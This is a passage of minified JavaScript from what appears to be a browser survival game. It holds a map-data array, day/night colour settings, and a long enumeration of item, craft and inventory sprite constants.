[1, "de", 55, 19, 33, 0], [1, "de", 55, 19, 32, 0], [1, "de", 55, 19, 31, 0], [1, "de", 55, 19, 30, 0], [1, "de", 55, 19, 28, 0], [1, "de", 55, 19, 29, 0], [1, "de", 55, 19, 27, 0], [1, "de", 55, 19, 26, 0], [1, "de", 55, 19, 25, 0], [1, "de", 55, 19, 24, 0], [1, "de", 55, 19, 23, 0], [1, "de", 55, 19, 22, 0], [1, "de", 55, 19, 21, 0], [1, "de", 55, 19, 20, 0], [1, "de", 55, 19, 18, 0], [1, "de", 55, 19, 19, 0], [1, "de", 55, 19, 16, 0], [1, "de", 55, 19, 17, 0], [1, "de", 55, 19, 15, 0], [1, "de", 55, 19, 14, 0], [1, "de", 55, 19, 13, 0], [1, "de", 55, 19, 12, 0], [1, "de", 55, 19, 11, 0], [1, "de", 55, 19, 10, 0], [1, "de", 55, 19, 9, 0], [1, "de", 55, 19, 8, 0], [1, "de", 55, 84, 35, 0], [1, "de", 55, 84, 32, 0], [1, "de", 55, 84, 25, 0], [1, "de", 50, 84, 24, 0], [1, "de", 55, 84, 20, 0], [1, "de", 55, 84, 17, 0], [1, "de", 55, 84, 16, 0], [1, "de", 50, 84, 15, 0], [1, "de", 55, 84, 8, 0], [1, "de", 55, 84, 9, 0], [1, "de", 50, 85, 11, 0], [1, "de", 55, 81, 39, 0], [1, "de", 50, 83, 40, 0], [1, "de", 55, 72, 39, 0], [1, "de", 55, 74, 39, 0], [1, "de", 55, 66, 39, 0], [1, "de", 55, 65, 39, 0], [1, "de", 50, 67, 41, 0], [1, "de", 55, 56, 39, 0], [1, "de", 55, 58, 39, 0], [1, "de", 55, 50, 39, 0], [1, "de", 50, 49, 39, 0], [1, "de", 55, 44, 39, 0], [1, "de", 55, 42, 39, 0], [1, "de", 50, 43, 39, 0], [1, "de", 50, 41, 39, 0], [1, "de", 50, 37, 39, 0], [1, "de", 55, 36, 39, 0], [1, "de", 55, 32, 39, 0], [1, "de", 50, 31, 39, 0], [1, "de", 55, 23, 39, 0], [1, "de", 55, 18, 37, 0], [1, "de", 50, 18, 36, 0], [1, "de", 55, 18, 35, 0], [1, "de", 50, 18, 34, 0], [1, "de", 55, 18, 31, 0], [1, "de", 50, 18, 30, 0], [1, "de", 55, 18, 25, 0], [1, "de", 50, 18, 24, 0], [1, "de", 55, 18, 20, 0], [1, "de", 55, 18, 14, 0], [1, "de", 50, 18, 15, 0], [1, "de", 55, 18, 8, 0], [1, "de", 54, 90, 154, 0], [1, "de", 51, 89, 154, 0], [1, "de", 54, 85, 154, 0], [1, "de", 54, 81, 154, 0], [1, "de", 54, 76, 154, 0], [1, "de", 54, 70, 154, 0], [1, "de", 54, 66, 154, 0], [1, "de", 54, 61, 154, 0], [1, "de", 54, 56, 154, 0], [1, "de", 54, 53, 154, 0], [1, "de", 54, 45, 154, 0], [1, "de", 54, 42, 154, 0], [1, "de", 54, 37, 154, 0], [1, "de", 54, 30, 154, 0], [1, "de", 54, 25, 154, 0], [1, "de", 54, 17, 154, 0], [1, "de", 54, 10, 154, 0], [1, "de", 54, 8, 154, 0], [1, "de", 55, 20, 9, 0], [1, "de", 53, 93, 154, 0], [1, "de", 53, 93, 156, 0], [1, "de", 53, 93, 158, 0], [1, "de", 52, 91, 157, 0], [1, "de", 53, 93, 159, 0], [1, "de", 53, 93, 161, 0], [1, "de", 53, 93, 162, 0], [1, "de", 53, 93, 163, 0], [1, "de", 53, 93, 164, 0], [1, "de", 53, 93, 165, 0], [1, "de", 53, 93, 166, 0], [1, "de", 53, 93, 167, 0], [1, "de", 52, 91, 167, 0], [1, "de", 53, 93, 169, 0], [1, "de", 53, 93, 168, 0], [1, "de", 53, 93, 170, 0], [1, "de", 53, 93, 171, 0], [1, "de", 53, 93, 173, 0], [1, "de", 53, 93, 176, 0], [1, "de", 53, 93, 175, 0], [1, "de", 53, 92, 169, 0], [1, "de", 53, 93, 178, 0], [1, "de", 53, 93, 179, 0], [1, "de", 53, 93, 180, 0], [1, "de", 53, 93, 181, 0], [1, "de", 53, 93, 183, 0], [1, "de", 53, 93, 184, 0], [1, "de", 53, 93, 186, 0], [1, "de", 18, 95, 185, 0], [1, "de", 53, 93, 187, 0], [1, "de", 53, 93, 188, 0], [1, "de", 52, 91, 186, 0], [1, "de", 53, 93, 190, 0], [1, "de", 53, 93, 192, 0], [1, "de", 53, 93, 195, 0], [1, "de", 53, 93, 194, 0], [1, "de", 52, 91, 196, 0], [1, "de", 53, 93, 197, 0], [1, "de", 53, 93, 200, 0], [1, "de", 53, 93, 198, 0], [1, "de", 53, 93, 201, 0], [1, "de", 53, 93, 202, 0], [1, "de", 53, 93, 203, 0], [1, "de", 53, 93, 204, 0], [1, "de", 53, 93, 206, 0], [1, "de", 53, 93, 205, 0], [1, "de", 53, 93, 207, 0], [1, "de", 53, 93, 209, 0], [1, "de", 53, 93, 210, 0], [1, "de", 53, 93, 212, 0], [1, "de", 52, 91, 204, 0], [1, "de", 53, 93, 213, 0], [1, "de", 53, 93, 214, 0], [1, "de", 53, 93, 215, 0], [1, "de", 53, 93, 216, 0], [1, "de", 53, 93, 217, 0], [1, "de", 53, 93, 218, 0], [1, "de", 53, 93, 219, 0], [1, "de", 53, 93, 220, 0], [1, "de", 52, 92, 213, 0], [1, "de", 52, 92, 206, 0], [1, "de", 52, 92, 202, 0], [1, "de", 53, 92, 201, 0], [1, "de", 52, 92, 194, 0], [1, "de", 52, 92, 178, 0], [1, "de", 52, 92, 171, 0], [1, "de", 53, 93, 221, 0], [1, "de", 53, 93, 222, 0], [1, "de", 53, 93, 223, 0], [1, "de", 53, 93, 225, 0], [1, "de", 53, 93, 228, 0], [1, "de", 53, 93, 227, 0], [1, "de", 52, 92, 217, 0], [1, "de", 53, 92, 218, 0], [1, "de", 52, 92, 221, 0], [1, "de", 52, 92, 225, 0], [1, "de", 52, 93, 226, 0], [1, "de", 52, 93, 224, 0], [1, "de", 52, 93, 208, 0], [1, "de", 52, 93, 211, 0], [1, "de", 52, 93, 196, 0], [1, "de", 52, 93, 199, 0], [1, "de", 52, 93, 189, 0], [1, "de", 52, 93, 191, 0], [1, "de", 52, 93, 193, 0], [1, "de", 52, 93, 182, 0], [1, "de", 52, 93, 185, 0], [1, "de", 52, 93, 172, 0], [1, "de", 52, 93, 174, 0], [1, "de", 52, 93, 177, 0], [1, "de", 52, 93, 155, 0], [1, "de", 52, 93, 157, 0], [1, "de", 52, 93, 160, 0], [1, "de", 52, 92, 162, 0], [1, "de", 53, 93, 229, 0], [1, "de", 53, 93, 231, 0], [1, "de", 53, 93, 232, 0], [1, "de", 53, 93, 234, 0], [1, "de", 52, 93, 230, 0], [1, "de", 52, 92, 228, 0], [1, "de", 53, 93, 235, 0], [1, "de", 53, 93, 236, 0], [1, "de", 53, 93, 237, 0], [1, "de", 53, 93, 239, 0], [1, "de", 53, 93, 240, 0], [1, "de", 52, 93, 238, 0], [1, "de", 53, 93, 241, 0], [1, "de", 52, 93, 242, 0], [1, "de", 52, 93, 243, 0], [1, "de", 53, 93, 244, 0], [1, "de", 53, 93, 246, 0], [1, "de", 53, 93, 245, 0], [1, "de", 52, 93, 247, 0], [1, "de", 53, 93, 248, 0], [1, "de", 52, 92, 235, 0], [1, "de", 52, 92, 245, 0], [1, "de", 52, 93, 249, 0], [1, "de", 53, 93, 250, 0], [1, "de", 53, 93, 251, 0], [1, "de", 53, 93, 252, 0], [1, "de", 53, 93, 254, 0], [1, "de", 52, 93, 253, 0], [1, "de", 52, 93, 255, 0], [1, "de", 53, 93, 257, 0], [1, "de", 53, 93, 256, 0], [1, "de", 52, 93, 258, 0], [1, "de", 53, 93, 259, 0], [1, "de", 52, 93, 260, 0], [1, "de", 53, 93, 263, 0], [1, "de", 53, 93, 264, 0], [1, "de", 53, 93, 265, 0], [1, "de", 52, 93, 266, 0], [1, "de", 53, 93, 267, 0], [1, "de", 52, 93, 268, 0], [1, "de", 52, 93, 269, 0], [1, "de", 53, 93, 276, 0], [1, "de", 53, 93, 277, 0], [1, "de", 52, 93, 278, 0], [1, "de", 53, 93, 279, 0], [1, "de", 52, 93, 280, 0], [1, "de", 52, 93, 283, 0], [1, "de", 53, 93, 284, 0], [1, "de", 53, 93, 285, 0], [1, "de", 53, 93, 286, 0], [1, "de", 52, 93, 287, 0], [1, "de", 53, 93, 288, 0], [1, "de", 53, 93, 289, 0], [1, "de", 52, 93, 290, 0], [1, "de", 52, 93, 291, 0], [1, "de", 53, 93, 292, 0], [1, "de", 52, 93, 293, 0], [1, "de", 53, 93, 294, 0], [1, "de", 52, 93, 295, 0], [1, "de", 52, 93, 296, 0], [1, "de", 53, 93, 297, 0], [1, "de", 53, 93, 298, 0], [1, "de", 52, 93, 299, 0], [1, "de", 53, 93, 300, 0], [1, "de", 52, 92, 298, 0], [1, "de", 52, 92, 293, 0], [1, "r", 92, 262, 0], [1, "r", 93, 262, 0], [1, "de", 52, 93, 261, 0], [1, "cs", 0, 223, 104, 1], [1, "cs", 2, 223, 105, 1], [1, "cs", 2, 223, 102, 1], [1, "cs", 2, 223, 103, 1], [1, "la", 3, 141, 8, 1], [1, "cs", 2, 140, 9, 1], [1, "la", 4, 142, 9, 1], [1, "de", 4, 81, 149, 0], [1, "f", 0, 83, 148, 1], [1, "f", 1, 82, 149, 1], [1, "de", 34, 81, 156, 0], [1, "de", 51, 17, 9, 0], [1, "de", 54, 16, 9, 0], [1, "de", 54, 15, 9, 0], [1, "cs", 3, 223, 106, 1], [1, "p", 0, 119, 279, 1], [1, "p", 0, 109, 242, 1], [1, "cs", 1, 29, 9, 1], [1, "cs", 2, 30, 9, 1], [1, "cs", 2, 31, 9, 1], [1, "cs", 2, 32, 9, 1], [1, "cs", 2, 33, 9, 1], [1, "cs", 2, 69, 9, 1], [1, "cs", 2, 71, 9, 1], [1, "cs", 2, 70, 9, 1], [1, "cs", 1, 72, 9, 1], [1, "cs", 2, 73, 9, 1], [1, "de", 10, 31, 10, 0], [1, "de", 10, 29, 10, 0], [1, "de", 10, 44, 10, 0], [1, "de", 4, 87, 10, 0], [1, "de", 4, 86, 10, 0], [1, "de", 5, 87, 9, 0], [1, "de", 5, 13, 10, 0], [1, "de", 4, 14, 11, 0], [1, "de", 4, 16, 10, 0], [1, "de", 4, 17, 10, 0], [1, "cs", 2, 146, 9, 1], [1, "cs", 2, 148, 9, 1], [1, "cs", 2, 150, 9, 1], [1, "cs", 2, 153, 9, 1], [1, "cs", 2, 155, 9, 1], [1, "cs", 1, 149, 9, 1], [1, "cs", 1, 154, 9, 1], [1, "cs", 3, 147, 9, 1], [1, "cs", 3, 151, 9, 1], [1, "cs", 3, 152, 9, 1], [1, "cs", 3, 156, 9, 1], [1, "cs", 3, 157, 9, 1], [1, "cs", 3, 158, 9, 1], [1, "cs", 3, 159, 9, 1], [1, "cs", 3, 160, 9, 1], [1, "cs", 0, 161, 9, 1], [1, "cs", 2, 162, 9, 1], [1, "cs", 2, 163, 9, 1], [1, "cs", 1, 164, 9, 1], [1, "cs", 2, 165, 9, 1], [1, "cs", 3, 166, 9, 1], [1, "cs", 3, 168, 9, 1], [1, "cs", 3, 170, 9, 1], [1, "cs", 1, 169, 9, 1], [1, "cs", 2, 167, 9, 1], [1, "cs", 2, 171, 9, 1], [1, "cs", 2, 173, 9, 1], [1, "cs", 2, 172, 9, 1], [1, "cs", 2, 174, 9, 1], [1, "cs", 1, 175, 9, 1], [1, "cs", 3, 176, 9, 1], [1, "cs", 3, 178, 9, 1], [1, "cs", 3, 179, 9, 1], [1, "cs", 0, 180, 9, 1], [1, "cs", 2, 177, 9, 1], [1, "cs", 2, 182, 9, 1], [1, "cs", 2, 181, 9, 1], [1, "cs", 2, 183, 9, 1], [1, "cs", 2, 184, 9, 1], [1, "cs", 2, 185, 9, 1], [1, "cs", 2, 186, 9, 1], [1, "cs", 1, 187, 9, 1], [1, "cs", 2, 188, 9, 1], [1, "cs", 3, 189, 9, 1], [1, "cs", 3, 190, 9, 1], [1, "cs", 3, 191, 9, 1], [1, "cs", 2, 192, 9, 1], [1, "cs", 0, 193, 9, 1], [1, "cs", 2, 194, 9, 1], [1, "cs", 2, 196, 9, 1], [1, "cs", 2, 198, 9, 1], [1, "cs", 2, 200, 9, 1], [1, "cs", 3, 195, 9, 1], [1, "cs", 3, 197, 9, 1], [1, "cs", 3, 199, 9, 1], [1, "cs", 0, 201, 9, 1], [1, "cs", 2, 202, 9, 1], [1, "cs", 2, 203, 9, 1], [1, "cs", 3, 208, 9, 1], [1, "cs", 3, 207, 9, 1], [1, "cs", 3, 206, 9, 1], [1, "cs", 3, 205, 9, 1], [1, "cs", 3, 204, 9, 1], [1, "cs", 3, 214, 9, 1], [1, "cs", 3, 215, 9, 1], [1, "cs", 3, 216, 9, 1], [1, "cs", 3, 217, 9, 1], [1, "cs", 3, 218, 9, 1], [1, "b", 0, 5, 159, 0], [1, "b", 0, 5, 171, 0], [2, "isl", 1, 122, 63, 0], [2, "isl", 2, 119, 277, 0], [2, "isl", 2, 109, 244, 0], [2, "isl", 2, 114, 205, 0], [2, "isl", 1, 120, 150, 0], [2, "isl", 2, 154, 129, 0], [2, "isl", 0, 184, 158, 0], [2, "isl", 1, 208, 128, 0], [2, "isl", 1, 215, 132, 0], [2, "isl", 1, 214, 128, 0], [2, "isl", 1, 209, 132, 0], [1, "la", 3, 217, 20, 1], [1, "la", 1, 215, 19, 1], [1, "la", 0, 212, 18, 1], [1, "la", 4, 214, 18, 1], [1, "la", 4, 216, 19, 1], [1, "la", 4, 211, 20, 1], [1, "la", 3, 210, 19, 1], [1, "la", 3, 215, 21, 1], [1, "la", 1, 214, 20, 1], [1, "la", 3, 214, 22, 1], [1, "la", 3, 214, 24, 1], [1, "la", 4, 214, 26, 1], [1, "la", 4, 213, 27, 1], [1, "la", 1, 212, 28, 1], [1, "la", 2, 212, 29, 1], [1, "la", 5, 212, 30, 1], [1, "la", 4, 208, 19, 1], [1, "la", 4, 207, 19, 1], [1, "la", 1, 206, 19, 1], [1, "la", 1, 205, 19, 1], [1, "la", 2, 204, 19, 1], [1, "la", 5, 203, 19, 1], [1, "la", 3, 210, 17, 1]]
                , e = 0
                , ze = {
                    GROUND: ["#133A2B", "#042b30"],
                    SNOW_GROUND: ["#EBF2F0", "#136167"],
                    CRAFT_LOADING: ["#4EB687", "#187484"],
                    BROWN_LIFE: ["#664516", "#13474C"],
                    SAND_COLOR: ["#FCEFBB", "#0F4D48"],
                    SAND_SHOVEL_CO: ["#C1AA7E", "#0F423D"],
                    GRD_SHOVEL_CO: ["#594837", "#163A3A"],
                    ICE_SHOVEL_CO: ["#A5D6D6", "#539CA0"],
                    WATER_3_COLOR: ["#0B6A84", "#09373F"],
                    WATER_2_COLOR: ["#2A8B9B", "#0F464C"],
                    WATER_1_COLOR: ["#A9D6D3", "#115E60"],
                    FLOAM_COLOR: ["#ECF7F9", "#539CA0"],
                    WEAPON_LOADING: ["#FFF", "#FFF"],
                    HELMET_LOADING: ["#FFF", "#FFF"],
                    SWIM_COLOR: ["#1C9BA4", "#00272F"],
                    LAVA_GROUND: ["#2D2017", "#031C1E"],
                    DAY: 0,
                    NIGHT: 1,
                    DRAGON_DEN_X: 2300,
                    DRAGON_DEN_Y: 2290,
                    FLAKES_NUMBER: 34,
                    FLAKES_SIZES: 5,
                    SAND_NUMBER: 68,
                    ASHES_NUMBER: 34,
                    ASHES_SIZES: 5,
                    SMOG: 1,
                    SMOG_PUSH: .6,
                    SMOG_SPEED: .25,
                    STEP_SPACE: 50,
                    TRAIL_SPACE: 10,
                    SWIM_SPACE: 75,
                    GHOST_BUBBLES: 20,
                    BUBBLES_SIZES: 5,
                    SWORD: e++,
                    PICK: e++,
                    FUR: e++,
                    PICK_GOLD: e++,
                    PICK_DIAMOND: e++,
                    SWORD_GOLD: e++,
                    SWORD_DIAMOND: e++,
                    HAND: e++,
                    PICK_WOOD: e++,
                    PIRATE_SWORD: e++,
                    EARMUFFS: e++,
                    COAT: e++,
                    WOOD_SPEAR: e++,
                    SPEAR: e++,
                    GOLD_SPEAR: e++,
                    DIAMOND_SPEAR: e++,
                    DRAGON_SPEAR: e++,
                    LAVA_SPEAR: e++,
                    CRAB_SPEAR: e++,
                    REIDITE_SWORD: e++,
                    DIAMOND_PROTECTION: e++,
                    AMETHYST_PROTECTION: e++,
                    REIDITE_PROTECTION: e++,
                    EXPLORER_HAT: e++,
                    PIRATE_HAT: e++,
                    STONE_HELMET: e++,
                    GOLD_HELMET: e++,
                    DIAMOND_HELMET: e++,
                    BOOK: e++,
                    BAG: e++,
                    SWORD_AMETHYST: e++,
                    PICK_AMETHYST: e++,
                    PICK_REIDITE: e++,
                    AMETHYST_SPEAR: e++,
                    REIDITE_SPEAR: e++,
                    HAMMER: e++,
                    HAMMER_GOLD: e++,
                    HAMMER_DIAMOND: e++,
                    HAMMER_AMETHYST: e++,
                    HAMMER_REIDITE: e++,
                    CAP_SCARF: e++,
                    CHRISTMAS_HAT: e++,
                    ELF_HAT: e++,
                    AMETHYST_HELMET: e++,
                    REIDITE_HELMET: e++,
                    SUPER_HAMMER: e++,
                    SHOVEL: e++,
                    SUPER_DIVING_SUIT: e++,
                    DIVING_MASK: e++,
                    WATERING_CAN_FULL: e++,
                    SHOVEL_GOLD: e++,
                    SHOVEL_DIAMOND: e++,
                    SHOVEL_AMETHYST: e++,
                    PITCHFORK: e++,
                    PITCHFORK2: e++,
                    SPANNER: e++,
                    MACHETE: e++,
                    SWORD_WOOD: e++,
                    WOOD_HELMET: e++,
                    DRAGON_HELMET: e++,
                    LAVA_HELMET: e++,
                    CROWN_CRAB: e++,
                    DRAGON_SWORD: e++,
                    LAVA_SWORD: e++,
                    WOOD_BOW: e++,
                    STONE_BOW: e++,
                    GOLD_BOW: e++,
                    DIAMOND_BOW: e++,
                    AMETHYST_BOW: e++,
                    REIDITE_BOW: e++,
                    DRAGON_BOW: e++,
                    WOOD_SHIELD: e++,
                    STONE_SHIELD: e++,
                    GOLD_SHIELD: e++,
                    DIAMOND_SHIELD: e++,
                    AMETHYST_SHIELD: e++,
                    REIDITE_SHIELD: e++,
                    CROWN_GREEN: e++,
                    CROWN_ORANGE: e++,
                    CROWN_BLUE: e++,
                    TURBAN1: e++,
                    TURBAN2: e++,
                    PILOT_HELMET: e++,
                    HOOD: e++,
                    PEASANT: e++,
                    WINTER_HOOD: e++,
                    WINTER_PEASANT: e++,
                    FLOWER_HAT: e++,
                    FUR_HAT: e++,
                    SADDLE: e++,
                    WITCH: e++,
                    NIMBUS: e++,
                    WAND1: e++,
                    WAND2: e++,
                    FIREFLY_ITEM: e++,
                    WOOD_ARROW: e++,
                    STONE_ARROW: e++,
                    GOLD_ARROW: e++,
                    DIAMOND_ARROW: e++,
                    AMETHYST_ARROW: e++,
                    REIDITE_ARROW: e++,
                    DRAGON_ARROW: e++,
                    STONES: e++,
                    TREE: e++,
                    PLANT: e++,
                    GOLD: e++,
                    DIAMOND: e++,
                    WOOD_FIRE: e++,
                    WORKBENCH: e++,
                    PLANT_SEED: e++,
                    MEAT: e++,
                    COOKED_MEAT: e++,
                    BIG_FIRE_WOOD: e++,
                    FURNACE_OFF: e++,
                    PAPER: e++,
                    AMETHYST: e++,
                    AMETHYST_WALL: e++,
                    AMETHYST_SPIKE: e++,
                    DOOR_AMETHYST_CLOSE: e++,
                    BRIDGE: e++,
                    SAND: e++,
                    BOTTLE_FULL: e++,
                    BOTTLE_EMPTY: e++,
                    KRAKEN_SKIN: e++,
                    WATERING_CAN: e++,
                    FLOUR: e++,
                    WHEAT_SEED: e++,
                    COOKIE: e++,
                    WILD_WHEAT: e++,
                    WINDMILL: e++,
                    CAKE: e++,
                    FOODFISH: e++,
                    FOODFISH_COOKED: e++,
                    SCALES: e++,
                    INV_GROUND: e++,
                    PLOT: e++,
                    INV_ICE: e++,
                    INV_BREAD: e++,
                    BREAD_OVEN_OFF: e++,
                    INV_SANDWICH: e++,
                    FUR_WINTER: e++,
                    BLUE_CORD: e++,
                    LOCK: e++,
                    DRAGON_HEART: e++,
                    LAVA_HEART: e++,
                    RESURRECTION: e++,
                    EMERALD_MACHINE: e++,
                    EXTRACTOR_MACHINE_STONE: e++,
                    EXTRACTOR_MACHINE_GOLD: e++,
                    EXTRACTOR_MACHINE_DIAMOND: e++,
                    EXTRACTOR_MACHINE_AMETHYST: e++,
                    EXTRACTOR_MACHINE_REIDITE: e++,
                    LOCKPICK: e++,
                    TOTEM: e++,
                    SPIKE: e++,
                    CORD: e++,
                    WALL: e++,
                    STONE_WALL: e++,
                    GOLD_WALL: e++,
                    DIAMOND_WALL: e++,
                    DOOR_WOOD_CLOSE: e++,
                    CHEST: e++,
                    STONE_SPIKE: e++,
                    GOLD_SPIKE: e++,
                    DIAMOND_SPIKE: e++,
                    DOOR_STONE_CLOSE: e++,
                    DOOR_GOLD_CLOSE: e++,
                    DOOR_DIAMOND_CLOSE: e++,
                    FUR_WOLF: e++,
                    INV_GEMME_BLUE: e++,
                    INV_GEMME_GREEN: e++,
                    INV_GEMME_ORANGE: e++,
                    INV_SPECIAL_FUR: e++,
                    INV_SPECIAL_FUR_2: e++,
                    INV_BUCKET_FULL: e++,
                    INV_BUCKET_EMPTY: e++,
                    WELL_EMPTY: e++,
                    SIGN: e++,
                    DRAGON_CUBE: e++,
                    DRAGON_ORB: e++,
                    LAVA_CUBE: e++,
                    LAVA_ORB: e++,
                    PLANT_PUMPKIN: e++,
                    PUMPKIN: e++,
                    ROOF: e++,
                    PLANT_GARLIC: e++,
                    GARLIC: e++,
                    PLANT_THORNBUSH: e++,
                    THORNBUSH: e++,
                    BANDAGE: e++,
                    INV_CRAB_STICK: e++,
                    INV_CRAB_LOOT: e++,
                    BED: e++,
                    SUGAR_CAN: e++,
                    INV_CANDY: e++,
                    GARLAND: e++,
                    REIDITE: e++,
                    MAGMA: e++,
                    PLANT_CARROT: e++,
                    CARROT: e++,
                    PLANT_TOMATO: e++,
                    TOMATO: e++,
                    PLANT_WATERMELON: e++,
                    WATERMELON: e++,
                    PLANT_ALOE_VERA: e++,
                    ALOE_VERA_GROWN: e++,
                    WOOD_DOOR_SPIKE: e++,
                    STONE_DOOR_SPIKE: e++,
                    GOLD_DOOR_SPIKE: e++,
                    DIAMOND_DOOR_SPIKE: e++,
                    AMETHYST_DOOR_SPIKE: e++,
                    REIDITE_WALL: e++,
                    REIDITE_DOOR: e++,
                    REIDITE_SPIKE: e++,
                    REIDITE_DOOR_SPIKE: e++,
                    WOOD_TOWER: e++,
                    PENGUIN_FEATHER: e++,
                    BOAT: e++,
                    SLED: e++,
                    BOAT_WAVE: e++,
                    SLED_WAVE: e++,
                    MOUNT_BOAR: e++,
                    BOAR_STEP: e++,
                    CRAB_STICK: e++,
                    CRAB_LOOT: e++,
                    CRAB_BOSS: e++,
                    BABY_DRAGON: e++,
                    BABY_LAVA: e++,
                    CRAB_STEP: e++,
                    HAWK: e++,
                    PLANE: e++,
                    HAWK_FEATHER: e++,
                    VULTURE: e++,
                    ALOE_VERA: e++,
                    VULTURE_FEATHER: e++,
                    EMERALD: e++,
                    FUR_BOAR: e++,
                    DECORATION: e++,
                    FOD: e++,
                    FIREFLY: e++,
                    HURT_FIREFLY: e++,
                    SPELL: e++,
                    BABY_MAMMOTH: e++,
                    BABY_MAMMOTH_STEP: e++,
                    CRATE: e++,
                    SEED: e++,
                    INV_DRAGON_ORB: e++,
                    INV_LAVA_ORB: e++,
                    CRAFT_SWORD: e++,
                    BODY: e++,
                    CRAFT_PICK: e++,
                    CRAFT_PICK_DIAMOND: e++,
                    INV_PICK_GOLD: e++,
                    MINIMAP: e++,
                    SPIDER: e++,
                    INV_SWORD: e++,
                    CRAFT_WORK: e++,
                    CRAFT_STONE_WALL: e++,
                    RABBIT: e++,
                    CRAFT_GOLD_WALL: e++,
                    WEB: e++,
                    GAUGES: e++,
                    CRAFT_DOOR_WOOD_CLOSE: e++,
                    CHEST_PLANT: e++,
                    CHEST_GOLD: e++,
                    CHEST_DIAMOND: e++,
                    CHEST_PICK_GOLD: e++,
                    CHEST_FIRE: e++,
                    CHEST_PICK_WOOD: e++,
                    CHEST_MEAT: e++,
                    CHEST_BIG_FIRE: e++,
                    INV_PLANT: e++,
                    LEADERBOARD: e++,
                    HURT: e++,
                    COLD: e++,
                    HUNGER: e++,
                    GROUND_FIRE: e++,
                    COUNTER: e++,
                    CRAFT_SEED: e++,
                    HERB: e++,
                    HAND_SHADOW: e++,
                    PLANT_MINI: e++,
                    FIRE: e++,
                    HALO_FIRE: e++,
                    CRAFT_SWORD_GOLD: e++,
                    CRAFT_SWORD_DIAMOND: e++,
                    INV_SWORD_GOLD: e++,
                    INV_SWORD_DIAMOND: e++,
                    FRUIT: e++,
                    CRAFT_PICK_GOLD: e++,
                    INV_PICK_DIAMOND: e++,
                    INV_GOLD: e++,
                    INV_DIAMOND: e++,
                    WOLF: e++,
                    INV_MEAT: e++,
                    GEAR2: e++,
                    CRAFT_FIRE: e++,
                    INV_BANDAGE: e++,
                    CRAFT_BANDAGE: e++,
                    INV_CORD: e++,
                    YOUR_SCORE: e++,
                    TREE_BRANCH: e++,
                    HEAL: e++,
                    INV_FIRE: e++,
                    INV_WORK: e++,
                    INV_SEED: e++,
                    INV_PICK: e++,
                    INV_PICK_WOOD: e++,
                    CRAFT_PICK_WOOD: e++,
                    INV_STONE: e++,
                    INV_WOOD: e++,
                    INV_WALL: e++,
                    CRAFT_WALL: e++,
                    INV_SPIKE: e++,
                    CRAFT_SPIKE: e++,
                    WHEAT_MOB: e++,
                    HURT_RABBIT: e++,
                    INV_COOKED_MEAT: e++,
                    GEAR: e++,
                    CRAFT_COOKED_MEAT: e++,
                    HURT_WOLF: e++,
                    CRAFT_BIG_FIRE: e++,
                    INV_BIG_FIRE: e++,
                    INV_STONE_WALL: e++,
                    INV_GOLD_WALL: e++,
                    INV_DIAMOND_WALL: e++,
                    CRAFT_DIAMOND_WALL: e++,
                    HURT_SPIDER: e++,
                    EMPTY_SLOT: e++,
                    INV_DOOR_WOOD_CLOSE: e++,
                    DOOR_WOOD_OPEN: e++,
                    INV_CHEST: e++,
                    CRAFT_CHEST: e++,
                    CHEST_SLOT: e++,
                    CHEST_SWORD: e++,
                    CHEST_PICK: e++,
                    CHEST_STONE: e++,
                    CHEST_WOOD: e++,
                    CHEST_PICK_DIAMOND: e++,
                    CHEST_SWORD_GOLD: e++,
                    CHEST_SWORD_DIAMOND: e++,
                    CHEST_WORK: e++,
                    CHEST_SEED: e++,
                    CHEST_WALL: e++,
                    CHEST_SPIKE: e++,
                    CHEST_COOKED_MEAT: e++,
                    CHEST_BANDAGE: e++,
                    CHEST_CORD: e++,
                    CHEST_STONE_WALL: e++,
                    CHEST_GOLD_WALL: e++,
                    CHEST_DIAMOND_WALL: e++,
                    CHEST_DOOR_WOOD_CLOSE: e++,
                    CHEST_WORKBENCH: e++,
                    CHEST_CHEST: e++,
                    CRAFT_STONE_SPIKE: e++,
                    INV_STONE_SPIKE: e++,
                    INV_GOLD_SPIKE: e++,
                    CRAFT_GOLD_SPIKE: e++,
                    INV_DIAMOND_SPIKE: e++,
                    CRAFT_DIAMOND_SPIKE: e++,
                    CHEST_PLUS: e++,
                    CRAFT_BAG: e++,
                    INV_FUR: e++,
                    INV_EARMUFFS: e++,
                    CRAFT_EARMUFFS: e++,
                    CRAFT_DOOR_STONE_CLOSE: e++,
                    INV_DOOR_STONE_CLOSE: e++,
                    DOOR_STONE_OPEN: e++,
                    CRAFT_DOOR_GOLD_CLOSE: e++,
                    INV_DOOR_GOLD_CLOSE: e++,
                    DOOR_GOLD_OPEN: e++,
                    CRAFT_DOOR_DIAMOND_CLOSE: e++,
                    INV_DOOR_DIAMOND_CLOSE: e++,
                    DOOR_DIAMOND_OPEN: e++,
                    CRAFT_COAT: e++,
                    INV_COAT: e++,
                    CHEST_STONE_SPIKE: e++,
                    CHEST_GOLD_SPIKE: e++,
                    CHEST_DIAMOND_SPIKE: e++,
                    CHEST_BAG: e++,
                    CHEST_FUR: e++,
                    CHEST_EARMUFFS: e++,
                    CHEST_DOOR_STONE_CLOSE: e++,
                    CHEST_DOOR_GOLD_CLOSE: e++,
                    CHEST_DOOR_DIAMOND_CLOSE: e++,
                    CHEST_COAT: e++,
                    INV_BAG: e++,
                    INV_FUR_WOLF: e++,
                    CHEST_FUR_WOLF: e++,
                    INV_SPEAR: e++,
                    CRAFT_SPEAR: e++,
                    CHEST_SPEAR: e++,
                    INV_GOLD_SPEAR: e++,
                    CRAFT_GOLD_SPEAR: e++,
                    CHEST_GOLD_SPEAR: e++,
                    INV_WOOD_SPEAR: e++,
                    CRAFT_WOOD_SPEAR: e++,
                    CHEST_WOOD_SPEAR: e++,
                    INV_DIAMOND_SPEAR: e++,
                    CRAFT_DIAMOND_SPEAR: e++,
                    CHEST_DIAMOND_SPEAR: e++,
                    FURNACE_ON: e++,
                    INV_FURNACE: e++,
                    CRAFT_FURNACE: e++,
                    CHEST_FURNACE: e++,
                    FURNACE_SLOT: e++,
                    FURNACE_BUTTON: e++,
                    FIR: e++,
                    STONES_WINTER: e++,
                    GOLD_WINTER: e++,
                    DIAMOND_WINTER: e++,
                    GROUND_FIRE_WINTER: e++,
                    INV_AMETHYST: e++,
                    FOX: e++,
                    INV_EXPLORER_HAT: e++,
                    CRAFT_EXPLORER_HAT: e++,
                    CHEST_EXPLORER_HAT: e++,
                    INV_PIRATE_HAT: e++,
                    CRAFT_PIRATE_HAT: e++,
                    CHEST_PIRATE_HAT: e++,
                    INV_PILOT_HELMET: e++,
                    CRAFT_PILOT_HELMET: e++,
                    CHEST_PILOT_HELMET: e++,
                    INV_STONE_HELMET: e++,
